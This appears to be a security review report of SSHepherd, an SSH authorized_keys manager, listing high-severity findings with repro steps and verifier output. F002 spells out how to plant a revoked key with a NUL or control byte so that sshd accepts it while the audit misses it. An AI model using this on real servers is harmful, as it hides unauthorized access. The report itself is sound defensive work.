# SSHepherd full review (2026-11-10)

Repo: master `9722c42`, clean tree. Review date 2026-11-10. Read-only review: nothing in the repo was changed.
Two rounds: a main round of 12 lenses (findings F001-F046) and a gap round of 8 gap lenses (findings G001-G040).
Critical and high findings had 3 verifiers; a finding dies if 2 of 3 refute it. Medium findings had 1 verifier. Low findings were not verified.

## 1. Summary

### Counts by severity and status

| Severity | CONFIRMED | PLAUSIBLE | UNVERIFIED | REFUTED | Total |
|---|---|---|---|---|---|
| critical | 0 | 0 | 0 | 0 | 0 |
| high | 8 | 0 | 0 | 1 | 9 |
| medium | 33 | 0 | 0 | 1 | 34 |
| low | 0 | 0 | 43 | 0 | 43 |
| **all** | 41 | 0 | 43 | 2 | 86 |

No critical findings. Every high and medium finding that reached a verifier was reproduced, except G003 and G019, which were refuted as "works as the owner designed it". Low findings were not verified; their finders still marked 38 of 43 CONFIRMED (they ran something) and 5 PLAUSIBLE.

Suggested re-rates from the gap round (not applied here; owner call): F025 low -> medium (K8-1), F037 low -> medium (K8-2), F005 high -> medium (K8-3).

### Counts by lens

| Lens | high | medium | low | confirmed | refuted | unverified | total |
|---|---|---|---|---|---|---|---|
| access-model | 1 | 0 | 1 | 1 | 0 | 1 | 2 |
| architecture | 0 | 1 | 3 | 1 | 0 | 3 | 4 |
| concurrency | 0 | 2 | 1 | 2 | 0 | 1 | 3 |
| container | 1 | 1 | 1 | 2 | 0 | 1 | 3 |
| contract-docs | 0 | 1 | 3 | 1 | 0 | 3 | 4 |
| injection | 2 | 2 | 1 | 4 | 0 | 1 | 5 |
| performance | 0 | 1 | 1 | 1 | 0 | 1 | 2 |
| product | 0 | 3 | 5 | 3 | 0 | 5 | 8 |
| ssh-crypto | 1 | 1 | 1 | 2 | 0 | 1 | 3 |
| supply-chain | 0 | 4 | 3 | 4 | 0 | 3 | 7 |
| test-quality | 0 | 1 | 3 | 1 | 0 | 3 | 4 |
| write-path | 1 | 1 | 0 | 2 | 0 | 0 | 2 |
| gap-import-pipeline-sshcfg-reconcile-f1 | 0 | 5 | 2 | 5 | 0 | 2 | 7 |
| gap-keyfile-private-key-handling | 0 | 1 | 3 | 1 | 0 | 3 | 4 |
| gap-manifest-store-and-editor | 1 | 4 | 4 | 5 | 0 | 4 | 9 |
| gap-preserve-external-keys | 1 | 2 | 0 | 3 | 0 | 0 | 3 |
| gap-real-sshd-integration-and-scripts | 0 | 1 | 2 | 1 | 0 | 2 | 3 |
| gap-remote-posture-lock-probe-header | 0 | 2 | 3 | 2 | 0 | 3 | 5 |
| gap-revoke-rotate-cmd-and-keyarg | 1 | 2 | 5 | 1 | 2 | 5 | 8 |
| gap-verify-unverified-and-split-claims | 0 | 0 | 1 | 0 | 0 | 1 | 1 |

F020 counts under both container and product (merged from L10-2 and L12-1), so the lens rows add up to 87, not 86.

### Fix these first

1. **G001 (high)**: YAML merge keys (`<<:`) get past the editor's shape check. `revoke --from-server` then writes an `except:` that overrides the merged one, so the user gains every server it was kept off. An access-removal command widens access. 3 of 3 verifiers reproduced it.
2. **F003 (high)**: the manifest accepts option values that sshd rejects (`permitopen` with no valid port, `environment` without `NAME=`, a non-number `tunnel`). apply writes dead lines and audit still exits 0, even for an operator key. That is a silent lockout risk. 3 of 3 reproduced, all rated high.
3. **F002 (high)**: a key line that sshd honors but x/crypto cannot parse (NUL after the blob, VT/FF/CR inside it) hides the key. A re-planted revoked key audits as exit 1 "unparseable entry", not REVOKED exit 2. 3 of 3 reproduced.
4. **F004 (high)**: if the reply to the `authorized_keys2` move-aside is lost, a REJECTED login check reports "lockout prevented" and exits 1 while keys2 stays disabled. 3 of 3 reproduced.
5. **G002 + G014 (high + medium)**: a `command:` preserve rule keeps lines that also allow port/agent/X11 forwarding, and its pattern can admit shell metacharacters, so a kept line can tunnel or run any command. audit says compliant (exit 0), even on a bastion. One owner decision covers both.

Next in line: F001 (a `@revoked` host CA or host cert exits 1, not 2; owner decision), F006 (README container recipes cannot land a key removal), F007 (bastion forwarding guard checks the wrong key).

Real sshd: the 12 main lenses did not run `make integration`. The critic flagged that, and gap reviewer K3 ran it at 9722c42 for alpine (49 s), debian (45 s) and rocky (78 s): all rc=0, 118 PASS each, no SKIP or FAIL. K3 also confirmed F002 on all three distros' sshd (alpine OpenSSH_10.3p1, debian 10.0p1, rocky 9.9p1). Other real-sshd evidence came from a local OpenSSH 10.5p1, single probe containers built from the repo's sshd test images, or the hermetic `sshtest` server.

## 2. Confirmed findings

Critical first. There are no critical findings. Evidence, repro, impact and fix text are copied from the finding files; verifier evidence is copied from the verdict files.

### 2.1 High (8)

#### F001 [high] A host certificate whose CA or host key is @revoked is classified host\_key (exit 1, no hint), not host\_key\_revoked (exit 2)

- **Status:** CONFIRMED
- **Lens(es):** ssh-crypto (raw ids: L01-1)
- **Location:** internal/sshconn/hostkey.go:39-56
- **Verifier votes:** correctness: reproduced (sev high) | reproduce: reproduced (sev high) | security: reproduced (sev medium)
- **Owner decision:** yes: a host certificate refused because its CA or its key is @revoked: classify as host\_key\_revoked (exit 2, like a plain @revoked key, recommended) or keep it under 'an invalid certificate from a vouched CA' (host\_key, exit 1)?

**Evidence** (verbatim from the finding):

~~~~text
hostKeyHint only recognises *knownhosts.RevokedError (plain keys). For a certificate, x/crypto's CertChecker.CheckCert returns fmt.Errorf("ssh: certificate serial %d revoked") (certs.go:422, IsRevoked checks cert.Key and cert.SignatureKey), which is neither RevokedError, KeyError nor noAuthorityPrefix, so it falls to `return classify(fleet.ErrorKindHostKey, err)` (hostkey.go:56). fleet.HostKeyAlert (errors.go:108) is false for host_key. Probe test (worktree, internal/sshconn, sshtest server serving an ed25519 host cert, serial 7): `go test ./internal/sshconn -run TestL01ProbeCertRevocation -v` -> `revoked CA, CA line kept: RESULT kind=host_key alert=false ... ssh: certificate serial 7 revoked hint=""`; `revoked host key served inside a cert: RESULT kind=host_key alert=false ... certificate serial 7 revoked hint=""`; control `revoked plain key: RESULT kind=host_key_revoked alert=true`. README exit table row 2: 'a host key `@revoked` in `known_hosts` (possible impersonation)' is exit 2 for audit, and for apply's login check.
~~~~

**Repro:**

~~~~text
known_hosts: `@cert-authority [127.0.0.1]:PORT <CA>` plus `@revoked * <CA>` (or `@revoked * <host plain key>`); server presents a host certificate signed by that CA for that key. Run sshepherd audit (or apply's post-write login check) against it.
~~~~

**Impact:** The case @revoked exists for (a compromised host CA, or a compromised host key re-served inside a certificate) is reported as an ordinary unreachable server: audit exits 1 instead of 2, no HOST KEY ALERT, no host\_key\_alerts count, apply's UNPROVEN login check exits 1 instead of 2, and the operator gets no remediation hint. The connection is still refused (no verification bypass), but monitoring that pages on exit 2 stays silent.

**Fix direction:** In hostKeyHint, recognise a certificate rejected by IsRevoked (check the presented cert's Key and SignatureKey against the snapshot's @revoked keys, rather than matching x/crypto's text) and classify it host\_key\_revoked with the @revoked hint; add the two rows to TestConnectHostKeyFailures.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev high):

~~~~text
Probe (worktree internal/sshconn/zz_vf001_probe_test.go, sshtest server with an ed25519 host cert signed by CA Key(50)): `GOTOOLCHAIN=go1.27.3 go test ./internal/sshconn -run TestVF001Probe -v -count=1` -> `revoked CA, CA line kept: kind=host_key alert=false err=... presented ssh-ed25519-cert-v01@openssh.com key ...: ssh: certificate serial 0 revoked hint=""`; `revoked host key inside cert: kind=host_key alert=false ... ssh: certificate serial 0 revoked hint=""`; `revoked CA, CA line removed: kind=host_key ... no authorities for hostname ... hint="... record the host's plain key or its CA (verified out of band)"`; control `revoked plain key: kind=host_key_revoked alert=true ... knownhosts: key is revoked`. Code: internal/sshconn/hostkey.go:39-44 (only *knownhosts.RevokedError -> host_key_revoked), :57 `return classify(fleet.ErrorKindHostKey, err)`; internal/fleet/errors.go:108 HostKeyAlert = changed|revoked|type_changed; x/crypto@v0.58.0 ssh/certs.go:421-422 `if c.IsRevoked != nil && c.IsRevoked(cert) { return fmt.Errorf("ssh: certificate serial %d revoked", cert.Serial) }`; ssh/knownhosts/knownhosts.go:441 `certChecker.IsRevoked = db.IsRevoked`. README.md:3151 exit 2 row: 'a host key `@revoked` in `known_hosts` (possible impersonation)'; README.md:3150 / spec audit-trust-posture:642 exit 1: 'an invalid certificate from a vouched CA (`host_key`)'.
~~~~

**reproduce** (reproduced, sev high):

~~~~text
Probe (own worktree, internal/sshconn/vf001_probe_test.go, sshtest server with an ed25519 host cert serial 7 signed by CA Key(50); known_hosts = '@cert-authority [127.0.0.1]:PORT CA' plus an @revoked line). Command: GOTOOLCHAIN=go1.27.3 go test ./internal/sshconn -run TestVF001Probe -v -count=1. Output:
 revoked CA: kind=host_key alert=false err=ssh deploy@127.0.0.1:62930: presented ssh-ed25519-cert-v01@openssh.com key SHA256:cSq3...: ssh: certificate serial 7 revoked hint="" attempts=0
 revoked host key inside cert: kind=host_key alert=false err=...: ssh: certificate serial 7 revoked hint="" attempts=0
 control plain revoked: kind=host_key_revoked alert=true err=...: knownhosts: key is revoked hint="this key is marked @revoked in ... — do not connect until the host is re-keyed ..." attempts=0
Code: hostkey.go:39 'var revoked *knownhosts.RevokedError'; hostkey.go:57 'return classify(fleet.ErrorKindHostKey, err)'; x/crypto certs.go:421-422 'if c.IsRevoked != nil && c.IsRevoked(cert) { return fmt.Errorf("ssh: certificate serial %d revoked", cert.Serial)'; knownhosts.go:171-178 IsRevoked checks plainKeyBlob(key) and key.SignatureKey; fleet/errors.go:107-108 HostKeyAlert = changed||revoked||type_changed; audit/errors.go:7 and apply/plan.go:843 use it. README:3151 lists exit 2 for 'a host key @revoked in known_hosts'. Spec audit-trust-posture-design.md:354-356 keeps 'certificate from a vouched signer that fails validation (expired, wrong principal)' at host_key and does not mention revocation.
~~~~

**security** (reproduced, sev medium):

~~~~text
Probe (own worktree, internal/sshconn/zz_probe_f001_test.go, sshtest server presenting an ed25519 host cert signed by the vouched CA): `go test ./internal/sshconn -run TestF001Probe -v` -> `RESULT revoked CA: kind=host_key alert=false hint="" err=... presented ssh-ed25519-cert-v01@openssh.com key ...: ssh: certificate serial 0 revoked`; `RESULT revoked host key in cert: kind=host_key alert=false hint="" ... certificate serial 0 revoked`; control `RESULT control revoked plain: kind=host_key_revoked alert=true hint="this key is marked @revoked in ..."`. x/crypto v0.58.0 certs.go CheckCert: `if c.IsRevoked != nil && c.IsRevoked(cert) { return fmt.Errorf("ssh: certificate serial %d revoked", cert.Serial) }`; knownhosts.go:171-178 IsRevoked checks plainKeyBlob(key) and key.SignatureKey. hostkey.go:57 `return classify(fleet.ErrorKindHostKey, err)`. fleet/errors.go:108 HostKeyAlert = changed || revoked || type_changed. Spec audit-trust-posture-design.md:642 'An invalid certificate from a vouched CA stays exit 1: it needs the CA's signature, so it is a stolen old host credential at worst.' README.md:3151 row 2 lists 'a host key `@revoked` in `known_hosts`'.
~~~~

</details>

#### F002 [high] A key line sshd honors but x/crypto cannot parse (NUL after the blob, VT/FF/CR inside it) hides the key: a re-planted revoked key audits as exit 1 'unparseable entry', not REVOKED exit 2

- **Status:** CONFIRMED
- **Lens(es):** injection (raw ids: L02-1)
- **Location:** internal/authkeys/authkeys.go:48 (ParseLine -> ssh.ParseAuthorizedKey); internal/audit/audit.go:88 (ParseErrs only make a server non-compliant); cmd/sshepherd/sweep.go:118 (unparsed = unprovable)
- **Verifier votes:** correctness: reproduced (sev high) | reproduce: reproduced (sev high) | security: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
Real sshd (OpenSSH_10.5p1, non-root sshd -d on 127.0.0.1:22999, AuthorizedKeysFile in the probe dir): printf '%s %s\000junk attacker\n' TYPE B64 > ak -> LOGIN_OK; blob split by \v, \f or \r ('ssh-ed25519 <30 chars>\v<rest> carol') -> LOGIN_OK for all three (sshd reads the line as a C string and b64_pton skips isspace; Go's base64 rejects NUL/VT/FF, and ParseLine rejects an embedded CR). Probe test in the audit package (memoryConfig: carol's key k9 revoked, serial 7), web-1 content = header + k1,k2,k3 + carol's key: plain line -> 'exit=2 reasons=[revoked_key] ... carol (REVOKED 2026-11-08) ... installed but REVOKED (CRITICAL: revoked key)'; same key as TYPE+' '+B64+'\x00junk carol' -> 'exit=1 reasons=[] ... ⚠ line 5: unparseable entry ... 0 unauthorized ... Summary: ... (0 critical) → exit 1'.
~~~~

**Repro:**

~~~~text
1) Manifest with a revoked: key tombstone. 2) On a server, append the revoked key as `ssh-ed25519 <base64>` immediately followed by a NUL byte (or insert \v/\f/\r inside the base64). 3) Log in with that key: sshd accepts. 4) sshepherd audit: the row is 'line N: unparseable entry', no fingerprint, exit 1; revoke --sweep calls the server unprovable instead of finding the revoked key.
~~~~

**Impact:** Whoever can write a managed authorized\_keys (a departed user who kept a foothold, a compromised co-managed account) can reinstall a revoked or unknown key so that it logs in while SSHepherd cannot name it: audit drops from 2 (a human must act now, D28) to 1 (generic drift), the REVOKED class never fires, and the line also pins apply into refusing that server. A file of nothing but such lines makes an operator look merely 'missing' while a stranger's key works.

**Fix direction:** Read each line the way sshd does before handing it to x/crypto (cut at the first NUL, drop isspace bytes inside the base64 field), or classify any unparseable line whose sshd-normalized form yields a key by that key (so revoked/unknown/operator checks run on it); at minimum grade an unparseable line that sshd would honor as critical. Add a differential fuzz oracle (see L02-5).

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev high):

~~~~text
sshd differential (probe dir, port 45233): plain LOGIN_OK; nul (printf '%s %s\000junk attacker') LOGIN_OK; vt LOGIN_OK; ff LOGIN_OK; cr LOGIN_OK; neg (truncated blob) LOGIN_FAIL Permission denied (publickey). Probe test internal/audit/zz_probe_f002_test.go in the worktree (go test -run TestProbeF002 -v): 'plain: exit=2 reasons=[revoked_key] parseErrs=[] ... carol (REVOKED 2026-11-08) ... installed but REVOKED (CRITICAL: revoked key) ... → exit 2'; 'nul: exit=1 reasons=[] parseErrs=[line 5: parse authorized_keys line: ssh: no key found; last parsing error for ignored line: illegal base64 data at input byte 4] ... ⚠ line 5: unparseable entry ... 0 unauthorized ... (0 critical) → exit 1'; vt and ff are the same as nul; 'cr: exit=1 reasons=[] parseErrs=[line 5: parse authorized_keys line: embedded carriage return] ... → exit 1'. Code: internal/authkeys/authkeys.go:43 'if strings.ContainsRune(trimmed, '\r') { return nil, fmt.Errorf("... embedded carriage return") }', :48 'pub, comment, options, _, err := ssh.ParseAuthorizedKey([]byte(line))'; internal/audit/audit.go:183-184 'actual, parseErrs := authkeys.ParseFile(read.Content); res.ParseErrs = parseErrs'; cmd/sshepherd/sweep.go:118-119 'if len(r.ParseErrs) > 0 { rep.Unprovable = append(... sweepUnparsed) }' (spec'd). Spec: 2026-07-06-audit-slice-design.md:178-181 'each bad line is reported as ⚠ line N: unparseable entry and the server counts non-compliant (exit 1)'.
~~~~

**reproduce** (reproduced, sev high):

~~~~text
sshd logs: plain/nul/vt/ff/cr -> 'debug1: .../ak:1: matching key found: ED25519 SHA256:ouGz...'; negative -> 'Failed publickey'. Probe TestF002Probe output: '=== plain: exit=2 reasons=[revoked_key] parseErrs=0 ... carol (REVOKED 2026-11-08) ... installed but REVOKED (CRITICAL: revoked key)'; '=== nul: exit=1 reasons=[] parseErrs=1 ... line 5: unparseable entry ... 0 unauthorized ... (0 critical) -> exit 1'; same for vt, ff, cr. Code: internal/authkeys/authkeys.go:44 rejects embedded CR, :47 ssh.ParseAuthorizedKey rejects NUL/VT/FF in base64; internal/audit/audit.go:183-184 ParseErrs only; cmd/sshepherd/sweep.go:118-119 unparsed -> Unprovable.
~~~~

**security** (reproduced, sev medium):

~~~~text
sshd probe (OUT/probe/v-F002-security, sshd -D -f own config, port 22997, ed25519 user key): plain LOGIN_OK; printf '%s %s\000junk carol' -> nul LOGIN_OK; blob split at 30 by \v -> vt LOGIN_OK; \f -> ff LOGIN_OK; \r -> cr LOGIN_OK; truncated blob -> negative_control LOGIN_FAIL. Audit probe (worktree, internal/audit/zz_probe_f002_test.go, memoryConfig + web-1 = Header(7)+k1,k2,k3+carol's k9 variant): 'plain: exit=2 revokedRow=true unparseable=false'; 'nul: exit=1 revokedRow=false unparseable=true' (report: '⚠ line 5: unparseable entry' / '→ 3 authorized · 3 present · 0 missing · 0 unauthorized' / 'Summary: 1/2 servers compliant · 1 with drift (0 critical) · 0 unreachable  → exit 1'); vt/ff/cr same as nul. Mitigating probe: memFiles(..., {1,2,3,8}) (fresh unknown key) -> 'exit=1 status=drift'. Code: internal/authkeys/authkeys.go:46 'if strings.ContainsRune(trimmed, '\r') { return nil, fmt.Errorf("...embedded carriage return") }' and :49 'ssh.ParseAuthorizedKey([]byte(line))'; internal/audit/audit.go:88 'len(r.ParseErrs) == 0 &&' (Compliant only); report.go:228 'unparseable entry'. Spec docs/superpowers/specs/2026-11-08-revocation-memory-design.md:547-548 makes parse errors unprovable for sweep (exit 1) by design.
~~~~

</details>

#### F003 [high] Manifest accepts option values sshd rejects (permitopen/permitlisten without a valid port, environment without NAME=, tunnel not a number), renders dead lines, and audit reports the key present & authorized (exit 0) even for an operator

- **Status:** CONFIRMED
- **Lens(es):** injection (raw ids: L02-2)
- **Location:** internal/authkeys/options.go:48,58,63 (no value validator; only expiry-time has one, line 125); used by config grant options (internal/config/restrict.go:41) and key lines (internal/config/config.go:283); audit cannotLogIn trusts IgnoredBySSHD (internal/audit/report.go:537)
- **Verifier votes:** correctness: reproduced (sev high) | reproduce: reproduced (sev high) | security: reproduced (sev high)

**Evidence** (verbatim from the finding):

~~~~text
Real sshd (OpenSSH_10.5p1) per line `<opt> ssh-ed25519 <key>`: permitopen="foo" -> 'Permission denied | bad key options: invalid permission port'; permitlisten="nope" -> same; environment="FOO" -> 'bad key options: invalid environment string'; tunnel="abc" -> 'bad key options: invalid tun device'; controls permitopen="foo:22", permitlisten="8080", environment="FOO=1", tunnel="1" -> LOGIN_OK. Probe test: manifest `op` operator with access `{user: op, servers: ["*"], options: ['permitopen="db"']}` and alice key line `environment="FOO" ssh-ed25519 ...` -> 'manifest loads; warnings=[]', render 'permitopen="db" ssh-ed25519 AAAA... op' / 'environment="FOO" ssh-ed25519 AAAA... alice', audit of exactly those bytes -> 'exit=0 reasons=[] ✓ op ... present & authorized ✓ alice ... present & authorized'. Same class: an option value with a NUL (`command="echo ok\x00"`, sshd sees an unterminated quote and ignores the line) on the operator's key audits as exit 1 'OPTIONS DIFFER', not CANNOT LOG IN.
~~~~

**Repro:**

~~~~text
Add `options: ['permitopen="db.internal"']` (port forgotten) to any access entry, `sshepherd validate` (passes), `sshepherd apply --yes`: every server the grant reaches gets a line sshd skips. The post-write login check only proves keys this run holds, so any other grantee (or an operator's offline break-glass key) is locked out silently; `sshepherd audit` then exits 0.
~~~~

**Impact:** A plausible typo in a restriction (the S7 feature this options table guards) locks out users fleet-wide with no warning from validate, apply or audit; for a protected/operator key it defeats the operator\_cannot\_log\_in critical class, which exists for exactly this case.

**Fix direction:** Give the table value validators matching sshd's auth-options.c (permitopen host:port or host:\*; permitlisten \[host:]port; environment NAME=value with a valid name; tunnel a number or 'any'; reject a NUL inside a quoted value in IgnoredBySSHD since sshd's C string ends there) and let CheckOption/IgnoredBySSHD use them; pin each with a real-sshd integration row.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev high):

~~~~text
Probe test in own worktree (internal/audit/zz_probe_test.go, trustConfig/runOne harness): CheckOption(permitopen="db")="" IgnoredBySSHD=<nil>; same for permitlisten="nope", environment="FOO", tunnel="abc", permitopen="db:0". key-line permitopen="db" on operator: warnings=[] reason="" status=compliant crit=[] (same for environment/tunnel/permitlisten). Grant form `{user: op, servers: ["*"], options: ['permitopen="db"']}`: loads, warnings=[], audit status=compliant crit=[]. Local /usr/sbin/sshd -d (OpenSSH_10.5p1) with AuthorizedKeysFile holding `<opt> ssh-ed25519 ...`: permitopen="db" -> Permission denied | bad key options: invalid permission port; permitlisten="nope" -> same; environment="FOO" -> invalid environment string; tunnel="abc" -> invalid tun device; controls permitopen="db:22", permitlisten="8080", environment="FOO=1", tunnel="1" -> LOGIN_OK. Code: options.go:126 'has an invalid value (want YYYYMMDD[HHMM[SS]][Z])' // only expiry-time has a validator today.
~~~~

**reproduce** (reproduced, sev high):

~~~~text
Probe (worktree, internal/audit/zz_f003_probe_test.go, GOTOOLCHAIN=go1.27.3 go test ./internal/audit -run TestF003Probe -v): for each case 'loads; warnings=[]', 'desired key options=[permitopen="db.internal"] ignoredBySSHD=<nil>', rendered 'permitopen="db.internal" ssh-ed25519 AAAAC3...hzfR', then 'exit=0 reasons=[]  ✓ op ... present & authorized ... Summary: 1/1 servers compliant ... → exit 0'; same for permitlisten="nope", environment="FOO", tunnel="abc". Real sshd (/usr/sbin/sshd -d, OpenSSH_10.5p1, port 22993): [permitopen="db.internal"] -> DENIED | ak:1: bad key options: invalid permission port; [permitopen="db.internal:5432"] -> LOGIN_OK; [permitlisten="nope"] -> DENIED | invalid permission port; [permitlisten="8080"] -> LOGIN_OK; [environment="FOO"] -> DENIED | invalid environment string; [environment="FOO=1"] -> LOGIN_OK; [tunnel="abc"] -> DENIED | invalid tun device; [tunnel="1"] -> LOGIN_OK; [no-pty] -> LOGIN_OK. Code: internal/authkeys/options.go:48 '"environment": {takesValue: true},', :58-59 permitlisten/permitopen with no value:, :63 '"tunnel": {takesValue: true},', :125 'return "has an invalid value (want YYYYMMDD[HHMM[SS]][Z])" // only expiry-time has a validator today'.
~~~~

**security** (reproduced, sev high):

~~~~text
Real sshd, line '<opt> ssh-ed25519 ...', login 'echo LOGIN_OK': permitopen="db" -> DENIED | bad key options: invalid permission port; permitopen="db:22" -> ok; permitlisten="nope" -> DENIED | invalid permission port; permitlisten="8080" -> ok; environment="FOO" -> DENIED | invalid environment string; environment="FOO=1" -> ok; tunnel="abc" -> DENIED | invalid tun device; tunnel="1" -> ok (OpenSSH_10.3p1). Probe TestProbeF003 (worktree, internal/audit): 'permitopen="db": loads warnings=0 desiredOpts=["permitopen=\"db\"" ""] reason="" status=compliant', the same for permitlisten="nope", environment="FOO" and tunnel="abc"; 'bogus-option: load error ... not a recognized authorized_keys option'; 'grant permitopen no port: err=<nil>  desired opts ["permitopen=\"db.internal\""]'. Code: options.go:48 "environment": {takesValue: true}, :57-58 permitlisten/permitopen with no value func, :63 "tunnel": {takesValue: true}; :126 '// only expiry-time has a validator today'; audit/report.go:537 trusts IgnoredBySSHD.
~~~~

</details>

#### F004 [high] authorized\_keys2 moved aside but its reply lost: a REJECTED login check reports 'lockout prevented' and exits 1 while keys2 stays disabled

- **Status:** CONFIRMED
- **Lens(es):** write-path (raw ids: L03-1)
- **Location:** internal/sshwrite/session.go:131-134 (disableKeys2), session.go:150-160 (rollback), internal/apply/exec.go:263-277 (failureOutcome)
- **Verifier votes:** correctness: reproduced (sev high) | reproduce: reproduced (sev high) | security: reproduced (sev medium)

**Evidence** (verbatim from the finding):

~~~~text
disableKeys2: `case err != nil: return "", sshconn.SanitizedError{...}` returns keys2Name "" although disableKeys2Cmd's `mv -f "$p" "$s"` runs before its `echo`; run() then calls proveOrRestore("") and rollback only moves keys2 back `if keys2Name != ""`; keys2Err is dropped when proveOrRestore returns. Probe test in a throwaway worktree (seamed FleetWriter, scriptedExec: checkUnchanged read ok, disableKeys2 exec err EOF, probe connect rejected with ErrorKindAuth), `go test ./internal/sshwrite -run TestL03Keys2 -v`: keys2-only (SkipWrite) -> `Restore=<nil> RestoreKeys2=<nil> FileKept=true cmds=2`, `message: lockout prevented — moved authorized_keys2 back (...); authorized_keys was not changed`; full write -> `message: lockout prevented — restored previous file (...)`. apply probe: failureOutcome of those shapes -> `keys2-only: outcome=failed rolledBack=false exit=1` and `outcome=failed rolledBack=true exit=1`. <!-- gitleaks:allow (probe output, not a secret) -->
~~~~

**Repro:**

~~~~text
Server with a non-empty ~/.ssh/authorized_keys2 whose key is the one this client can actually use (e.g. its authorized_keys line has a non-matching from=). apply/revoke plans a keys2-only write (KeysUnchanged) or a full write. The connection drops after disableKeys2Cmd's mv but before its 'sshepherd-keys2 NAME' line arrives. The post-write login (fresh connection) is REJECTED because keys2 is now aside. Result: no move-back is attempted, the report says 'lockout prevented — moved authorized_keys2 back', exit 1; keys2 is still at authorized_keys2.sshepherd.disabled and the client cannot log in. In the full-write case the restore of authorized_keys runs (over a reconnect) and the run also exits 1 whenever that reconnect succeeds (probe rejected for a slow exec, a forced command, or a prohibited bastion forward).
~~~~

**Impact:** A user can be locked out with exit 1 and a report that falsely claims the lockout was prevented; this contradicts the documented rule (CLAUDE.md P08, README line 3408) that a failed authorized\_keys2 move-back after a rejected login check is lockout\_unrestored and exit 2. The keys2 failure itself is never reported.

**Fix direction:** Treat a disableKeys2 outcome whose move may have happened (transport error after the session opened, or an unparseable name) as an unknown keys2 state: on a REJECTED verdict report it as an unrestored keys2 move-back (LockoutError.RestoreKeys2 non-nil, so lockout\_unrestored and exit 2), or recover the copy's name by listing authorized\_keys2.sshepherd.disabled\* over the restore session before moving it back; never return 'lockout prevented' while keys2's state is unknown. Also consider making restoreKeys2Cmd fail when the expected copy is missing instead of exiting 0.

<details><summary>Verifier evidence (verbatim)</summary>

**correctness** (reproduced, sev high):

~~~~text
Probe test in own worktree (internal/sshwrite/zz_f004_probe_test.go; scriptedExec responses: SkipWrite=[read ok 'x\n', disableKeys2 err EOF, ...]; full=[write 0, verify 'x\n', disableKeys2 err EOF, ...]; seamedConnect probeErr kinded(auth)). `GOTOOLCHAIN=go1.27.3 go test ./internal/sshwrite -run TestF004 -v` output:
 skip=true Restore=<nil> RestoreKeys2=<nil> FileKept=true cmds=2 keys2RestoreCmds=0
 message: lockout prevented — moved authorized_keys2 back (post-write login offering only the surviving keys you hold failed: ssh: unable to authenticate); authorized_keys was not changed
 skip=false Restore=<nil> RestoreKeys2=<nil> FileKept=false cmds=4 keys2RestoreCmds=0
 message: lockout prevented — restored previous file (post-write login offering only the surviving keys you hold failed: ssh: unable to authenticate)
Code: session.go:132-134 `case err != nil: return "", sshconn.SanitizedError{...}`; sshwrite.go:291 `mv -f "$p" "$s" || exit 1; echo "sshepherd-keys2 ${s##*/}"`; session.go:156 `if keys2Name != "" {`; session.go:51-54 keys2Err dropped when proveOrRestore errs; exec.go failureOutcome: `if lockout.Restore != nil || lockout.RestoreKeys2 != nil { return OutcomeLockoutUnrestored, restored }` else `return OutcomeFailed, restored`. The existing TestApplyDisableKeys2TransportError covers only the path where the login is proven.
~~~~

**reproduce** (reproduced, sev high):

~~~~text
Worktree probe internal/sshwrite/vf004_probe_test.go (seamedWriter, scriptedExec, rejected()), `GOTOOLCHAIN=go1.27.3 go test ./internal/sshwrite -run TestVF004 -v`:
 keys2-only (SkipWrite, responses: read ok, disableKeys2 err EOF): `Restore=<nil> RestoreKeys2=<nil> FileKept=true cmds=2`, `message: lockout prevented — moved authorized_keys2 back (post-write login offering only the surviving keys you hold failed: ssh: unable to authenticate); authorized_keys was not changed` (no restoreKeys2Cmd was run: cmds=2).
 full write (write ok, verify ok, disableKeys2 EOF): `Restore=<nil> RestoreKeys2=<nil> FileKept=false cmds=4`, `message: lockout prevented — restored previous file (...)`.
Worktree probe internal/apply/vf004_probe_test.go: `keys2-only lost reply: outcome=failed rolledBack=false`, `full write lost reply: outcome=failed rolledBack=true`, against the documented case `outcome=lockout_unrestored`. plan.go:836-839 makes only lockout_unrestored (or a revoked rollback) need a human, i.e. exit 2. <!-- gitleaks:allow (probe output, not a secret) -->
Real /bin/sh run of disableKeys2Cmd() with HOME set to a probe dir and stdout closed (`>&-`): exit 0, and ~/.ssh now holds only `authorized_keys2.sshepherd.disabled`. The mv lands even when the reply cannot be delivered.
The code: session.go:133 `case err != nil: return "", sshconn.SanitizedError{...}`. session.go:157 `if keys2Name != "" { lo.RestoreKeys2 = s.restoreKeys2(keys2Name) }`. session.go:51-54 `if err := s.proveOrRestore(keys2Name); err != nil { return err }; return keys2Err`.
~~~~

**security** (reproduced, sev medium):

~~~~text
Code: internal/sshwrite/sshwrite.go:292 `; mv -f "$p" "$s" || exit 1; echo "sshepherd-keys2 ${s##*/}"; fi`; internal/sshwrite/session.go:133-134 `case err != nil: return "", sshconn.SanitizedError{...disabling authorized_keys2 on %s failed...}`; session.go:50-54 `keys2Name, keys2Err := s.disableKeys2(); if err := s.proveOrRestore(keys2Name); err != nil { return err }`; session.go:156 `if keys2Name != "" { lo.RestoreKeys2 = s.restoreKeys2(keys2Name) }`; internal/apply/exec.go:271-274 `if lockout.Restore != nil || lockout.RestoreKeys2 != nil { return OutcomeLockoutUnrestored, restored }; return OutcomeFailed, restored`. The existing TestApplyDisableKeys2TransportError (session_drop_test.go:186) covers only a passing probe. Probe (own worktree, zz_f004_probe_test.go, scriptedExec with disable exec err EOF and the rejected() connect), `go test ./internal/sshwrite -run TestF004 -v`: `skip=true Restore=<nil> RestoreKeys2=<nil> FileKept=true cmds=2 ... message: lockout prevented — moved authorized_keys2 back (post-write login offering only the surviving keys you hold failed: ssh: unable to authenticate); authorized_keys was not changed` and `skip=false Restore=<nil> RestoreKeys2=<nil> FileKept=false cmds=4 ... message: lockout prevented — restored previous file (...)`. cmds=4 is write, verify, disable, restore, with no restoreKeys2 exec.
~~~~

</details>

#### F005 [high] A restriction clash about one user blocks every revoke from removing another user's revoked key on that server (no removal-only exception, unlike weak keys), and the printed fix hints point at an apply that refuses

- **Status:** CONFIRMED
- **Lens(es):** access-model (raw ids: L05-1)
- **Location:** internal/apply/plan.go:282 (restrictionRefusal before any removal-only check); internal/apply/serial.go:149 vs serial.go:160 (weakRefusal's removal-only exception); cmd/sshepherd/sweep.go:170 (clashed server classed fixable)
- **Verifier votes:** correctness: REFUTED (sev low) | reproduce: reproduced (sev medium) | security: reproduced (sev low)
